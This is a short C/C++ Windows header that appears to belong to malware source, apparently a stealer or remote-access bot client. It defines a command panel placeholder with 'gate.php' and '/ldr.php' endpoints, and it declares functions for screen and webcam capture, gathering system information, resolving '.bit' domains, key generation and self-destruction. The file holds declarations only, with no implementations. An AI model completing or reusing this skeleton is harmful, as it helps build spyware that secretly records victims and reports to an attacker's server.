#pragma once
#include <windows.h>

#define ADMIN_PANEL L"#LINK#"
#define API_URL L"gate.php"
#define LDR_URL "/ldr.php"

void randomInt(SIZE_T* out, int from, int to);
LPCWSTR resolveEnvrimoment(const WCHAR* env);
BOOL pathExists(LPCWSTR path, BOOL isFile);
LPCWSTR bitGetHostByName(LPCWSTR domain);
int captureScreenshot(LPCWSTR szFile);
void captureCam(WCHAR* szPath);
void CryptGenKey(BYTE** data);
LPCWSTR getSystemInfoW();
void selfDestruct();
LPCSTR genCountry();
CHAR* randKey();